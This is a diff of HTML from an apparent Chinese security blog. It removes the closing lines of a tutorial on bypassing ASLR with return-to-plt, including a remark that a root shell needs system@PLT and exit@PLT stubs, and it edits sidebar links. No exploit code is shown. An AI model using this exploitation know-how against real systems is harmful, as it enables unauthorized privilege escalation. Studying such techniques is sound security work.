-<p><u>注意</u>： 为了获取这个root shell，可执行文件必须包含’system@PLT’与’exit@PLT’代码。在<a href="http://www.csyssec.org/20170101/bypassaslr-gotgor" target="_blank" rel="external">第三篇</a>中，我会谈谈利用GOT覆盖与GOT解引用技术，在可执行文件中并没有需要的PLT存根代码并且系统已经打开了ASLR的情况下，攻击者如何调用libc函数。 </p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第一篇章(return-to-plt)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用<span class="article-category-count">14</span></a>
-
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ASLR/">ASLR</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
 
 
   <nav id="page-nav">
@@ -706,6 +662,18 @@
     </ul>
     <div class="widget">
       <ul>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170807/offensivesec/">offensivesec</a></h6>
+          <!--  <span>八月 7, 2017</span> -->
+            </div>
+
+          </li>
         
           <li class="clearfix">
 
@@ -882,18 +850,6 @@
             
 
               <h6 style="margin: 0;"><a href="/20170504/virtual-ret2dir/">利用虚拟化技术防御ret2dir攻击</a></h6>
-          <!--  <span>五月 4, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170504/smep-nx/">利用NX位实现基于软件的SMEP</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
